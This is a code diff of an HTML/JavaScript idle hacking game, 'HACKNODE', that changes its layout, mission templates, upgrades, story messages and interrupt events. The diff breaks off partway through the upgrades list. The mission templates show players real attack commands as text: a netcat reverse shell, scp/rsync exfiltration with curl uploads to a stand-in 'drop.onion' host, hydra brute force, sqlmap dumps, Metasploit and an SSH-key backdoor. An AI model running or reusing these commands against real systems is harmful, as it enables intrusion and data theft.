+.cfloat{position:fixed;pointer-events:none;font-family:‘Orbitron’,monospace;font-size:13px;color:#ffb700;text-shadow:0 0 8px #ffb700;z-index:500;animation:fup 1.2s ease-out forwards;}
+@keyframes fup{0%{opacity:1;-webkit-transform:translateY(0);transform:translateY(0);}100%{opacity:0;-webkit-transform:translateY(-40px);transform:translateY(-40px);}}
+@keyframes glitch{0%,100%{-webkit-transform:translate(0);transform:translate(0);filter:none;}20%{-webkit-transform:translate(-4px,2px);transform:translate(-4px,2px);filter:hue-rotate(90deg);}40%{-webkit-transform:translate(4px,-2px);transform:translate(4px,-2px);filter:hue-rotate(180deg) brightness(2);}60%{-webkit-transform:translate(-2px,4px);transform:translate(-2px,4px);filter:hue-rotate(270deg);}80%{-webkit-transform:translate(2px,-4px);transform:translate(2px,-4px);filter:brightness(3);}}
+.glitch{animation:glitch .4s ease forwards;}
+
+/* BOOT */
+#boot{position:fixed;top:0;left:0;right:0;bottom:0;background:#050a05;z-index:2000;display:-webkit-flex;display:flex;-webkit-align-items:center;align-items:center;-webkit-justify-content:center;justify-content:center;-webkit-flex-direction:column;flex-direction:column;gap:16px;}
+#bootlogo{font-family:‘Orbitron’,monospace;font-size:28px;font-weight:900;letter-spacing:8px;color:#00ff41;text-shadow:0 0 20px #00ff41,0 0 40px #00ff41;animation:glow 1s ease-in-out infinite;}
+@keyframes glow{50%{text-shadow:0 0 40px #00ff41,0 0 80px #00ff41;}}
+#bootstatus{font-size:11px;color:#4a7a4a;letter-spacing:2px;}
 </style>
 
 </head>
 <body style="background:#050a05;color:#00ff41;">
+<div id="crt"></div><div id="vig"></div>
 
-<!-- CRT & Vignette overlays as real elements for Safari -->
+<div id="boot"><div id="bootlogo">HACKNODE</div><div id="bootstatus">initializing...</div></div>
 
-<div id="crt-overlay"></div>
-<div id="vignette-overlay"></div>
-
-<!-- Boot Screen -->
-
-<div id="boot-screen">
-  <div id="boot-logo">HACKNODE</div>
-  <div id="boot-status">initializing...</div>
-</div>
-
-<!-- Offline Modal -->
-
-<div id="offline-modal">
-  <div id="offline-box">
-    <h2>// SYSTEM RECONNECT</h2>
-    <div id="offline-log"></div>
-    <button id="offline-ok" onclick="closeOfflineModal()">[ CONTINUE ]</button>
+<div id="offmod">
+  <div id="offbox">
+    <h2>// RECONNECTED</h2>
+    <div id="offlog"></div>
+    <button id="offok" onclick="closeOff()">[ CONTINUE ]</button>
   </div>
 </div>
 
-<!-- Main App -->
+<!-- INTERRUPT OVERLAY -->
+
+<div id="interrupt-overlay">
+  <div id="intbox">
+    <div id="int-title">⚠ ALERT</div>
+    <div id="int-body"></div>
+    <div id="int-timer"></div>
+    <div id="int-actions"></div>
+  </div>
+</div>
 
 <div id="app">
-
-  <!-- Header -->
-
-  <div id="header">
-    <div id="header-top">
+  <div id="hdr">
+    <div id="hdr-top">
       <div id="logo">HACKNODE</div>
-      <div id="alias-display">alias: <span id="alias-text">ghost_r00t</span></div>
+      <div id="alias">alias: <span id="alias-txt">ghost_r00t</span></div>
     </div>
-    <div id="stats-row">
-      <span>CREDS: $<span id="stat-credits" class="stat-val">0</span></span>
-      <span>BW: <span id="stat-bw" class="stat-val">56</span>kb/s</span>
-      <span>REP: <span id="stat-rep" class="stat-val">×1.0</span></span>
-      <span>RUNS: <span id="stat-runs" class="stat-val">0</span></span>
+    <div id="stats">
+      <span>CR: $<span class="sv" id="s-cr">0</span></span>
+      <span>BW: <span class="sv" id="s-bw">56kb</span>/s</span>
+      <span>CPU: <span class="sv" id="s-cpu">256MHz</span></span>
+      <span>REP: <span class="sv" id="s-rep">×1.0</span></span>
     </div>
-    <div id="heat-bar-wrap">
-      <span id="heat-label">TRACE</span>
-      <div id="heat-track"><div id="heat-fill"></div></div>
-      <span id="heat-pct">0%</span>
+    <div id="qind">QUEUE: <span id="qdisplay">—</span></div>
+    <div id="heatrow">
+      <span id="hlbl">TRACE</span>
+      <div id="htrk"><div id="hfill"></div></div>
+      <span id="hpct">0%</span>
     </div>
   </div>
 
-  <!-- Terminal Log -->
-
-  <div id="terminal"></div>
-
-  <!-- Command Area -->
+  <div id="term"></div>
 
   <div id="cmd-area">
-    <div id="progress-wrap">
-      <span id="progress-label">SCANNING</span>
-      <div id="progress-track"><div id="progress-fill"></div></div>
-      <span id="progress-pct">0%</span>
+    <div id="phlbl">// PHASE 1: EXECUTE COMMAND</div>
+    <div id="countdown"></div>
+    <div id="progwrap">
+      <span id="proglbl">TYPING</span>
+      <div id="progtrk"><div id="progfill"></div></div>
+      <span id="progpct">0%</span>
     </div>
-    <div id="cmd-display">
-      <span id="cmd-prompt">root@hacknode:~$</span>&nbsp;
-      <span id="cmd-text"></span>
-      <span id="cmd-cursor"></span>
+    <!-- Pre-stage next command during processing -->
+    <div id="prestage">
+      <div id="prestage-lbl">// STAGING NEXT</div>
+      <div id="prestage-cmd">
+        <span id="prestage-prompt">root@hacknode:~$</span>&nbsp;
+        <span id="prestage-typed"></span>
+        <span id="prestage-rest"></span>
+        <span id="prestage-cursor"></span>
+      </div>
     </div>
-    <button id="tap-btn" onclick="handleTap()">[ TAP TO EXECUTE ]</button>
+    <div id="cmddisplay">
+      <span id="cmdprompt">root@hacknode:~$</span>&nbsp;
+      <span id="cmdtxt"></span>
+      <span id="cmdcursor"></span>
+    </div>
+    <button id="tapbtn" onclick="handleTap()">[ SELECT MISSION ]</button>
   </div>
 
-  <!-- Bottom Nav -->
-
-  <div id="bottom-nav">
-    <button class="nav-btn active" id="nav-terminal" onclick="showPanel('none')">TERMINAL</button>
-    <button class="nav-btn" id="nav-missions" onclick="showPanel('missions')">MISSIONS</button>
-    <button class="nav-btn" id="nav-upgrades" onclick="showPanel('upgrades')">UPGRADES</button>
-    <button class="nav-btn" id="nav-system" onclick="showPanel('system')">SYSTEM</button>
+  <div id="botnav">
+    <button class="nb act" id="nb-terminal" onclick="showPanel('none')">TERMINAL</button>
+    <button class="nb" id="nb-missions" onclick="showPanel('missions')">MISSIONS</button>
+    <button class="nb" id="nb-upgrades" onclick="showPanel('upgrades')">UPGRADES</button>
+    <button class="nb" id="nb-system" onclick="showPanel('system')">SYSTEM</button>
   </div>
-
 </div>
 
-<!-- Sliding Panel -->
-
 <div id="panel">
-  <div class="panel-header">
-    <span id="panel-title">MISSIONS</span>
-    <button class="panel-close" onclick="showPanel('none')">✕</button>
-  </div>
+  <div class="phdr"><span id="panel-title">MISSIONS</span><button class="pclose" onclick="showPanel('none')">✕</button></div>
   <div id="panel-content"></div>
 </div>
 
 <script>
-// ════════════════════════════════════════════════
-// GAME STATE
-// ════════════════════════════════════════════════
-
-const SAVE_KEY = 'hacknode_v1';
-
-const DEFAULT_STATE = {
-  credits: 0,
-  rep: 1.0,
-  prestigeCount: 0,
-  alias: 'ghost_r00t',
-
-  // Resources
-  bandwidth: 56, // kb/s
-
-  // Heat
-  heat: 0, // 0-100
-
-  // Current mission
-  activeMission: null,
-  missionProgress: 0,
-  missionRunning: false,
-  missionTapsDone: 0,
-  missionTapsTotal: 0,
-
-  // Typing automation tier (0=1char, 1=1word, 2=full cmd, 3=auto)
-  typingTier: 0,
-
-  // Upgrades purchased (id -> level)
-  upgrades: {},
-
-  // Completed missions count
-  missionsCompleted: 0,
-
-  // Offline tracking
-  lastSeen: Date.now(),
+// ══════════════════════════════════════════════════════
+// STATE
+// ══════════════════════════════════════════════════════
+const SK='hacknode_v3';
+const DS={
+  credits:0,rep:1.0,prestigeCount:0,alias:'ghost_r00t',
+  bandwidth:56,cpu:256,ram:512,latency:200,
+  heat:0,phase:null,activeMission:null,
+  missionProgress:0,missionRunning:false,
+  missionQueue:[],maxQueueSize:1,
+  typingTier:0,upgrades:{},
+  missionsCompleted:0,
+  knownTargets:{}, // id -> {ip, port, user} — target intel from recon
+  interruptFails:0, // resets each mission
+  lastSeen:Date.now(),
 };
+let G=JSON.parse(JSON.stringify(DS));
+let TS={command:'',typed:0}; // main typing state
+let PS={command:'',typed:0}; // pre-stage state
+let tapCD=false,procInt=null,autoInt=null,intTimerInt=null,cdownInt=null;
+let activeInterrupt=null;
 
-let G = JSON.parse(JSON.stringify(DEFAULT_STATE));
-
-// Typing state
-let typingState = {
-  command: '',
-  typed: 0,
-  words: [],
-  chunkSize: 1, // chars per tap
-};
-
-let autoTickInterval = null;
-let heatDecayInterval = null;
-let tapCooldown = false;
-
-// ════════════════════════════════════════════════
-// MISSIONS DATA
-// ════════════════════════════════════════════════
-
-// ════════════════════════════════════════════════
-// PROCEDURAL GENERATION
-// ════════════════════════════════════════════════
-
-function randIP() {
-  return `${rnd(10,220)}.${rnd(0,255)}.${rnd(0,255)}.${rnd(1,254)}`;
+// ══════════════════════════════════════════════════════
+// PROCEDURAL
+// ══════════════════════════════════════════════════════
+function rnd(a,b){return Math.floor(Math.random()*(b-a+1))+a;}
+function randIP(){return `${rnd(10,220)}.${rnd(0,255)}.${rnd(0,255)}.${rnd(1,254)}`;}
+function randSN(){return `${rnd(10,192)}.${rnd(0,255)}.${rnd(0,255)}.0/24`;}
+function randPort(){return [22,23,80,443,3306,5432,8080,8443,27017,6379][rnd(0,9)];}
+function randUser(){return ['admin','root','user','ubuntu','postgres','deploy','svc_acc','dbadmin'][rnd(0,7)];}
+function randCVE(){return `CVE-${rnd(2020,2024)}-${rnd(1000,99999)}`;}
+function randHash(){return Array.from({length:8},()=>'0123456789abcdef'[rnd(0,15)]).join('');}
+function randFS(){return [512,1024,4096,16384,51200,102400,512000,1048576,2457600][rnd(0,8)];}
+function fmtFS(kb){if(kb>=1024*1024)return(kb/1024/1024).toFixed(1)+'GB';if(kb>=1024)return(kb/1024).toFixed(1)+'MB';return kb+'KB';}
+function buildEx(u,ip,kb){
+  const m=kb/1024;
+  if(m<10)return`scp -r ${u}@${ip}:/var/db/corp ./exfil/`;
+  if(m<100)return`scp -r -C ${u}@${ip}:/var/db/corp /tmp/stage/ && tar -czf dump.tar.gz /tmp/stage/`;
+  if(m<1024)return`rsync -avz --bwlimit=512 ${u}@${ip}:/var/db/ ./exfil/ --exclude="*.log"`;
+  return`rsync -avz --bwlimit=256 ${u}@${ip}:/var/db/ ./stage/ && split -b 256m ./stage/dump.sql chunk_ && for f in chunk_*; do curl -s -F "file=@$f" http://drop.onion/up; done`;
 }
-function randSubnet() {
-  return `${rnd(10,192)}.${rnd(0,255)}.${rnd(0,255)}.0/24`;
-}
-function randPort() {
-  const ports = [22, 23, 80, 443, 3306, 5432, 8080, 8443, 27017, 6379];
-  return ports[rnd(0, ports.length-1)];
-}
-function randUser() {
-  const users = ['admin','root','user','ubuntu','postgres','deploy','svc_acc','dbadmin'];
-  return users[rnd(0, users.length-1)];
-}
-function randCVE() {
-  return `CVE-${rnd(2020,2024)}-${rnd(1000,99999)}`;
-}
-function randHash() {
-  const chars = '0123456789abcdef';
-  return Array.from({length: 8}, () => chars[rnd(0,15)]).join('');
-}
-function randFileSize() {
-  // In KB, weighted toward sizes that feel real for bandwidth
-  const sizes = [512, 1024, 2048, 4096, 8192, 16384, 51200, 102400, 512000, 2457600];
-  return sizes[rnd(0, sizes.length - 1)];
-}
-function rnd(min, max) {
-  return Math.floor(Math.random() * (max - min + 1)) + min;
-}
-
-function formatFileSize(kb) {
-  if (kb >= 1024*1024) return (kb/1024/1024).toFixed(1) + 'GB';
-  if (kb >= 1024) return (kb/1024).toFixed(1) + 'MB';
-  return kb + 'KB';
-}
-
-// Build exfil command length reflects file size — bigger = longer command = more taps
-
-// Larger files get longer commands (more flags, more paths) = more taps
-function buildExfilCommand(user, ip, fileSizeKB) {
-  const sizeMB = fileSizeKB / 1024;
-  if (sizeMB < 10) {
-    // Small: simple command
-    return `scp -r ${user}@${ip}:/var/db/corp ./exfil/`;
-  } else if (sizeMB < 100) {
-    // Medium: add compression flag
-    return `scp -r -C ${user}@${ip}:/var/db/corp /tmp/exfil/ && tar -czf dump.tar.gz /tmp/exfil/`;
-  } else if (sizeMB < 1024) {
-    // Large: rsync with rate limiting to avoid detection
-    return `rsync -avz --bwlimit=512 ${user}@${ip}:/var/db/ ./exfil/ --exclude="*.log"`;
-  } else {
-    // Very large: split archive, staged transfer
-    return `rsync -avz --bwlimit=512 ${user}@${ip}:/var/db/ ./stage/ && split -b 256m ./stage/dump.sql exfil_chunk_ && for f in exfil_chunk_*; do curl -s -F "file=@$f" http://drop.onion/upload; done`;
-  }
-}
-
-// Generate a fresh procedural mission instance
-function generateMission(template) {
-  const ip = randIP();
-  const subnet = randSubnet();
-  const port = randPort();
-  const user = randUser();
-  const cve = randCVE();
-  const hash = randHash();
-  const fileSize = randFileSize();
-  const fileSizeStr = formatFileSize(fileSize);
-
-  const commands = {
-    nmap_local:     `nmap -sV -p ${port} ${subnet}`,
-    hydra_ssh:      `hydra -l ${user} -P rockyou.txt ssh://${ip}`,
-    scp_exfil:      buildExfilCommand(user, ip, fileSize),
-    metasploit_run: `msfconsole -x "use exploit/ms17_010; set RHOST ${ip}; run"`,
-    worm_deploy:    `python3 worm.py --target ${ip} --persist --hash ${hash}`,
+function genMission(t){
+  // Use known intel if available
+  const intel=G.knownTargets[t.id];
+  const ip=intel?.ip||randIP(), sn=intel?.sn||randSN(),
+        port=intel?.port||randPort(), user=intel?.user||randUser(),
+        cve=randCVE(), hash=randHash(), fs=randFS();
+  const intelBonus=!!intel;
+  const cmds={
+    nmap_scan:`nmap -sV -p ${port} ${sn}`,
+    john_crack:`john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt --format=sha256`,
+    hydra_ssh:`hydra -l ${user} -P rockyou.txt ssh://${ip}`,
+    nc_listen:`nc -lvnp 4444 & python3 -c "import pty;pty.spawn('/bin/bash')" | nc ${ip} 4444`,
+    scp_exfil:buildEx(user,ip,fs),
+    aircrack:`aircrack-ng -w rockyou.txt -b ${ip.split('.').slice(0,3).join('.')}:XX:XX:XX:XX capture.cap`,
+    sqlmap:`sqlmap -u "http://${ip}/login.php" --dump --batch --level=3`,
+    metasploit:`msfconsole -x "use exploit/ms17_010; set RHOST ${ip}; run"`,
+    ssh_backdoor:`ssh-keygen -t rsa -b 4096 -f ~/.ssh/id_backdoor && ssh-copy-id -i ~/.ssh/id_backdoor.pub ${user}@${ip}`,
+    worm_deploy:`python3 worm.py --target ${ip} --persist --hash ${hash}`,
   };
-
-  const descs = {
-    nmap_local:     `Scan subnet ${subnet}. Find open port ${port}.`,
-    hydra_ssh:      `Brute force SSH on ${ip} as '${user}'.`,
-    scp_exfil:      `Exfil ${fileSizeStr} from ${ip}. BW: ${formatBW(G.bandwidth)}/s`,
-    metasploit_run: `Deploy ${cve} against ${ip}. High risk.`,
-    worm_deploy:    `Deploy persistent node on ${ip}. [${hash}]`,
+  const descs={
+    nmap_scan:`Scan ${sn} for open port ${port}.`,
+    john_crack:`Offline hash crack. No trace risk.`,
+    hydra_ssh:`Brute force SSH on ${ip} as '${user}'.${intelBonus?' [INTEL BONUS]':''}`,
+    nc_listen:`Reverse shell via ${ip}.`,
+    scp_exfil:`Exfil ${fmtFS(fs)} from ${ip}.${intelBonus?' [INTEL: faster]':''}`,
+    aircrack:`Crack WiFi near ${ip.split('.').slice(0,2).join('.')}.x — very slow.`,
+    sqlmap:`SQL injection dump on ${ip}.`,
+    metasploit:`Deploy ${cve} against ${ip}.${intelBonus?' [INTEL: heat -30%]':''}`,
+    ssh_backdoor:`Install SSH key backdoor on ${ip}.`,
+    worm_deploy:`Deploy botnet node on ${ip}. [${hash}]`,
   };
-
-  // taps field is unused now — progress = typed chars / command.length
-  return {
-    ...template,
-    command: commands[template.id] || template.command,
-    desc: descs[template.id] || template.desc,
-    _fileSize: fileSize,
-  };
+  return{...t,command:cmds[t.id]||'',desc:descs[t.id]||'',_fs:fs,_ip:ip,_sn:sn,_port:port,_user:user,_intelBonus:intelBonus};
 }
 
-const MISSION_TEMPLATES = [
+// ══════════════════════════════════════════════════════
+// MISSION TEMPLATES
+// ══════════════════════════════════════════════════════
+const MT=[
+  {id:'nmap_scan',   name:'NETWORK SCAN',      type:'recon', typeTag:'RECON',
+   hPC:.010,hOC:3,  reward:{base:70},  unlockAt:[0,0],
+   driver:'latency', pBase:7,
+   drops:'intel', // running this stores intel for follow-up missions
+   flavor:['Sending SYN packets...','Host is up (0.0021s latency)','Scanning ports...','Discovered open port {port}/tcp','OS fingerprint: Linux 4.x','Version detection complete.'],
+  },
+  {id:'john_crack',  name:'OFFLINE HASH CRACK', type:'crack', typeTag:'CRACK',
+   hPC:.000,hOC:0,  reward:{base:90},  unlockAt:[3,0],
+   driver:'cpu',    pBase:30,
+   flavor:['Loading hash file...','Trying dictionary attack...','Testing {n} passwords/s...','Hash: {hash}...','Cracked: 1 password hash','Writing to john.pot'],
+  },
+  {id:'hydra_ssh',   name:'BRUTE FORCE: SSH',   type:'crack', typeTag:'CRACK',
+   hPC:.022,hOC:10, reward:{base:320}, unlockAt:[8,500],
+   driver:'cpu',    pBase:22,
+   flavor:['Loading 14,344,391 passwords...','[22][ssh] login: {user} pass: password123 — FAIL','[22][ssh] login: {user} pass: qwerty — FAIL','[22][ssh] Trying batch {n}/512...','[22][ssh] login: {user} pass: {hash} — SUCCESS','Session established.'],
+  },
+  {id:'nc_listen',   name:'REVERSE SHELL',      type:'recon', typeTag:'RECON',
+   hPC:.018,hOC:8,  reward:{base:280}, unlockAt:[12,800],
+   driver:'latency', pBase:15,
+   flavor:['Binding port 4444...','Waiting for connection...','Connection received from {ip}','Spawning PTY...','Shell: root@target:/# ','Access secured.'],
+  },
+  {id:'scp_exfil',   name:'EXFIL: CORP DATABASE',type:'exfil', typeTag:'EXFIL',
+   hPC:.025,hOC:15, reward:{base:900}, unlockAt:[20,3000],
+   driver:'bandwidth',pBase:28,
+   flavor:['Authenticating...','Sending file manifest...','Transferring: /var/db/users.sql ({pct}%)','Transferring: /var/db/finance.sql ({pct}%)','Verifying checksums...','Transfer complete. {size} moved.'],
+  },
+  {id:'aircrack',    name:'WIFI CRACK',          type:'crack', typeTag:'CRACK',
+   hPC:.005,hOC:2,  reward:{base:500}, unlockAt:[18,2000],
+   driver:'cpu',    pBase:55,
+   flavor:['Putting interface in monitor mode...','Capturing handshake packets...','Testing {n} passphrases...','WPA2 handshake captured...','Bruteforcing PSK...','Key found: [{hash}]'],
+  },
+  {id:'sqlmap',      name:'SQL INJECTION',       type:'exfil', typeTag:'EXFIL',
+   hPC:.030,hOC:14, reward:{base:750}, unlockAt:[25,5000],
+   driver:'bandwidth+latency',pBase:25,
+   flavor:['Testing injection points...','Parameter vulnerable: id={n}','Extracting database schema...','Dumping table: users ({pct}%)','Dumping table: sessions ({pct}%)','Dump complete.'],
+  },
+  {id:'metasploit',  name:'EXPLOIT: ZERO-DAY',   type:'crack', typeTag:'CRACK',
+   hPC:.040,hOC:22, reward:{base:2400},unlockAt:[40,15000],
+   driver:'cpu+ram', pBase:35,
+   flavor:['Loading exploit module...','Checking target compatibility...','Sending payload buffer...','Trigger: heap overflow at 0x{hash}','Waiting for shell...','Shell opened. uid=0(root)'],
+  },
+  {id:'ssh_backdoor',name:'SSH BACKDOOR',         type:'exfil', typeTag:'EXFIL',
+   hPC:.020,hOC:6,  reward:{base:1100,passive:true},unlockAt:[50,25000],
+   driver:'bandwidth+latency',pBase:20,
+   flavor:['Generating 4096-bit RSA key...','Uploading public key...','Adding to authorized_keys...','Testing connection...','Configuring keep-alive...','Backdoor installed.'],
+  },
+  {id:'worm_deploy', name:'DEPLOY: BOTNET NODE',  type:'exfil', typeTag:'EXFIL',
+   hPC:.025,hOC:8,  reward:{base:600,passive:true},unlockAt:[65,50000],
+   driver:'bandwidth+latency',pBase:18,
+   flavor:['Uploading worm payload...','Installing persistence daemon...','Configuring C2 callback...','Testing beacon... OK','Node registered in botnet.','Passive income stream active.'],
+  },
+];
+let MISSIONS=MT.map(t=>genMission(t));
+
+// ══════════════════════════════════════════════════════
+// UPGRADES
+// ══════════════════════════════════════════════════════
+const UPG=[
+  {id:'bw1',sec:'BANDWIDTH',name:'DSL Connection',   desc:'56k → 1Mb/s.',          mx:1,cost:()=>400,   apply:()=>{G.bandwidth=1000;},   cond:()=>true},
+  {id:'bw2',sec:'BANDWIDTH',name:'Cable Modem',      desc:'1Mb → 10Mb/s.',         mx:1,cost:()=>2000,  apply:()=>{G.bandwidth=10000;},  cond:()=>(G.upgrades.bw1||0)>=1},
+  {id:'bw3',sec:'BANDWIDTH',name:'Fiber Optic',      desc:'10Mb → 100Mb/s.',       mx:1,cost:()=>10000, apply:()=>{G.bandwidth=100000;}, cond:()=>(G.upgrades.bw2||0)>=1},
+  {id:'bw4',sec:'BANDWIDTH',name:'Dark Fiber',       desc:'100Mb → 1Gb/s.',        mx:1,cost:()=>50000, apply:()=>{G.bandwidth=1000000;},cond:()=>(G.upgrades.bw3||0)>=1},
+  {id:'cpu1',sec:'CPU',name:'Dual-Core',             desc:'256MHz → 1GHz. Crack 4×.',mx:1,cost:()=>600,  apply:()=>{G.cpu=1000;},   cond:()=>true},
+  {id:'cpu2',sec:'CPU',name:'Quad-Core Rig',         desc:'1GHz → 2.4GHz.',        mx:1,cost:()=>3500,  apply:()=>{G.cpu=2400;},   cond:()=>(G.upgrades.cpu1||0)>=1},
+  {id:'cpu3',sec:'CPU',name:'GPU Cluster',           desc:'2.4GHz → 4GHz eq.',     mx:1,cost:()=>18000, apply:()=>{G.cpu=4000;},   cond:()=>(G.upgrades.cpu2||0)>=1},
+  {id:'cpu4',sec:'CPU',name:'ASIC Array',            desc:'4GHz → 16GHz.',         mx:1,cost:()=>90000, apply:()=>{G.cpu=16000;},  cond:()=>(G.upgrades.cpu3||0)>=1},
+  {id:'ram1',sec:'MEMORY',name:'4GB RAM',            desc:'Exploit speed ×2.',     mx:1,cost:()=>2200,  apply:()=>{G.ram=4096;},   cond:()=>(G.upgrades.cpu1||0)>=1},
+  {id:'ram2',sec:'MEMORY',name:'16GB RAM',           desc:'Exploit speed ×4.',     mx:1,cost:()=>14000, apply:()=>{G.ram=16384;},  cond:()=>(G.upgrades.ram1||0)>=1},
+  {id:'lat1',sec:'NETWORK',name:'VPN Tunnel',        desc:'200ms → 80ms. Trace -25%. Interrupts -20%.',mx:1,cost:()=>800,  apply:()=>{G.latency=80;}, cond:()=>true},
+  {id:'lat2',sec:'NETWORK',name:'Tor Routing',       desc:'80ms → 30ms. Trace -50%. Interrupts -40%.',mx:1,cost:()=>4500, apply:()=>{G.latency=30;}, cond:()=>(G.upgrades.lat1||0)>=1},
+  {id:'lat3',sec:'NETWORK',name:'Dark Proxy',        desc:'30ms → 5ms. Trace -75%. Interrupts -70%.',mx:1,cost:()=>22000,apply:()=>{G.latency=5;},  cond:()=>(G.upgrades.lat2||0)>=1},
+  {id:'type1',sec:'SCRIPTING',name:'Tab Complete',   desc:'Each tap = full word.',  mx:1,cost:()=>250,   apply:()=>{G.typingTier=1;}, cond:()=>true},
+  {id:'type2',sec:'SCRIPTING',name:'Macro Hotkeys',  desc:'One tap = full command.',mx:1,cost:()=>1200,  apply:()=>{G.typingTier=2;}, cond:()=>(G.upgrades.type1||0)>=1},
+  {id:'type3',sec:'SCRIPTING',name:'Cron Scheduler', desc:'Auto-executes. True idle.',mx:1,cost:()=>8000, apply:()=>{G.typingTier=3;startAutoTick();},cond:()=>(G.upgrades.type2||0)>=1},
+  {id:'q1',sec:'TASK QUEUE',name:'Scheduler v1',     desc:'Queue up to 2 missions.',mx:1,cost:()=>5000,  apply:()=>{G.maxQueueSize=2;},cond:()=>G.missionsCompleted>=15},
+  {id:'q2',sec:'TASK QUEUE',name:'Scheduler v2',     desc:'Queue up to 3 missions.',mx:1,cost:()=>22000, apply:()=>{G.maxQueueSize=3;},cond:()=>(G.upgrades.q1||0)>=1},
+  {id:'q3',sec:'TASK QUEUE',name:'Scheduler v3',     desc:'Queue up to 5 missions.',mx:1,cost:()=>80000, apply:()=>{G.maxQueueSize=5;},cond:()=>(G.upgrades.q2||0)>=1},
+  {id:'dec1',sec:'SECURITY',name:'Decoy Server',     desc:'Trace decays 2× faster idle.',mx:1,cost:()=>1500,apply:()=>{},cond:()=>(G.upgrades.lat1||0)>=1},
+];
+
+// ══════════════════════════════════════════════════════
+// NARRATIVE BEATS
+// ══════════════════════════════════════════════════════
+const STORY=[
+  {at:1,  msg:"Your first successful breach. Somewhere, a log file just got a new entry."},
+  {at:5,  msg:"Five operations. You're getting faster. The networks are getting slower."},
+  {at:8,  msg:"Unknown handle 'v01d' messages you: 'nice work on the scan. we're watching.'"},
+  {at:15, msg:"DARKWEB MARKET: Your first data dump is live. Buyer confirmed. $0.12/record."},
+  {at:20, msg:"Your alias shows up in a security researcher's blog post. They spell it wrong."},
+  {at:30, msg:"v01d again: 'you should be more careful. they're not just watching the networks.'"},
+  {at:40, msg:"BREAKING: FBI announces Operation GHOSTNET. Task force targeting unknown hacker."},
+  {at:50, msg:"v01d: 'I know who you are. I'm not them. But they're close. Burn soon.'"},
+  {at:65, msg:"Your botnet has 47 nodes. It whispers to you now. Always running. Always watching."},
+];
+let shownStory=new Set();
+
+function checkStory(){
+  STORY.forEach(s=>{
+    if(!shownStory.has(s.at)&&G.missionsCompleted>=s.at){
+      shownStory.add(s.at);
+      setTimeout(()=>{
+        logSep();
+        log(`// ${s.msg}`,'story');
+        logSep();
+      },800);
+    }
+  });
+}
+
+// ══════════════════════════════════════════════════════
+// INTERRUPT SYSTEM
+// ══════════════════════════════════════════════════════
+const INTERRUPTS=[
   {
-    id: 'nmap_local',
-    name: 'NETWORK SCAN',
-    type: 'recon',
-    typeTag: 'RECON',
-    desc: '',
-    command: '',
-    taps: 20,
-    heatPerTick: 0.4,
-    heatOnComplete: 5,
-    reward: { credits: 120, mult: true },
-    unlockAt: 0,
+    id:'interpol_scan',
+    title:'⚠ INTERPOL SCAN DETECTED',
+    body:'Anomalous traffic flagged on your subnet. A scan is sweeping toward your node in {timer}s.',
+    type:'timed_tap', // single tap button, countdown
+    timer:12,
+    tapLabel:'[ SPOOF MAC ADDRESS ]',
+    successMsg:'MAC spoofed. Scan missed you.',
+    failMsg:'Scan hit your node. Heat spike.',
+    heatOnFail:25,
+    condition:()=>G.heat>30,
   },
   {
-    id: 'hydra_ssh',
-    name: 'BRUTE FORCE: SSH',
-    type: 'crack',
-    typeTag: 'CRACK',
-    desc: '',
-    command: '',
-    taps: 38,
-    heatPerTick: 0.8,
-    heatOnComplete: 10,
-    reward: { credits: 380, mult: true },
-    unlockAt: 1,
+    id:'honeypot',
+    title:'⚠ HONEYPOT DETECTED',
+    body:'The target is responding suspiciously. This may be a trap. What do you do?',
+    type:'choice',
+    choices:[
+      {label:'[ ABORT — Pull out now ]',     cls:'safe',  outcome:'abort',   msg:'Safely disconnected. Mission lost.'},
+      {label:'[ PUSH — Stay and finish ]',   cls:'risky', outcome:'continue',msg:'Pushed through. Trace elevated.'},
+      {label:'[ SPOOF — Fake your origin ]', cls:'',      outcome:'spoof',   msg:'Spoofed. Continuing with penalty.'},
+    ],
+    condition:()=>G.missionsCompleted>=5,
   },
   {
-    id: 'scp_exfil',
-    name: 'EXFIL: CORP DATABASE',
-    type: 'exfil',
-    typeTag: 'EXFIL',
-    desc: '',
-    command: '',
-    taps: 30, // overridden by calcExfilTaps
-    heatPerTick: 1.2,
-    heatOnComplete: 15,
-    reward: { credits: 750, mult: true },
-    unlockAt: 3,
+    id:'isp_flag',
+    title:'⚠ ISP BANDWIDTH FLAG',
+    body:'Your upload pattern triggered an automated ISP alert. Throttle connection now or reroute?',
+    type:'choice',
+    choices:[
+      {label:'[ THROTTLE — Slow down ]',      cls:'safe',  outcome:'throttle', msg:'Throttled. Process slowed 2×.'},
+      {label:'[ REROUTE — New exit node ]',   cls:'risky', outcome:'reroute',  msg:'Rerouted. Small heat spike.'},
+    ],
+    condition:()=>G.phase==='process',
   },
   {
-    id: 'metasploit_run',
-    name: 'EXPLOIT: ZERO-DAY',
-    type: 'crack',
-    typeTag: 'CRACK',
-    desc: '',
-    command: '',
-    taps: 52,
-    heatPerTick: 1.8,
-    heatOnComplete: 20,
-    reward: { credits: 1800, mult: true },
-    unlockAt: 6,
+    id:'rival',
+    title:'⚠ RIVAL HACKER DETECTED',
+    body:'Unknown actor is competing for this target. Tap fast to lock them out before they do.',
+    type:'race', // rapid tap, 5 taps in countdown
+    timer:10,
+    tapsNeeded:6,
+    tapLabel:'[ LOCK THEM OUT ]',
+    successMsg:'Target secured. Rival blocked.',
+    failMsg:'Rival got partial access. Reward halved.',
+    condition:()=>G.missionsCompleted>=10,
   },
   {
-    id: 'worm_deploy',
-    name: 'DEPLOY: BOTNET NODE',
-    type: 'exfil',
-    typeTag: 'EXFIL',
-    desc: '',
-    command: '',
-    taps: 42,
-    heatPerTick: 1.0,
-    heatOnComplete: 8,
-    reward: { credits: 500, passive: 15, mult: true },
-    unlockAt: 8,
+    id:'auth_expired',
+    title:'⚠ SESSION TOKEN EXPIRED',
+    body:'Authentication dropped. Tap to re-authenticate before the window closes.',
+    type:'timed_tap',
+    timer:8,
+    tapLabel:'[ RE-AUTHENTICATE ]',
+    successMsg:'Re-authenticated. Continuing.',
+    failMsg:'Session lost. Mission aborted.',
+    heatOnFail:15,
+    condition:()=>true,
   },
 ];
 
-// Active generated missions (regenerated each time you pick one)
-let MISSIONS = MISSION_TEMPLATES.map(t => generateMission(t));
+let intState={active:false,tapsGiven:0,timerLeft:0,intObj:null,rewardHalved:false,processPaused:false};
 
-// ════════════════════════════════════════════════
-// UPGRADES DATA
-// ════════════════════════════════════════════════
-
-const UPGRADES = [
-  // Bandwidth
-  {
-    id: 'bw1', section: 'BANDWIDTH',
-    name: 'DSL Connection',
-    desc: 'Upgrade from 56k → 1Mb/s',
-    maxLevel: 1,
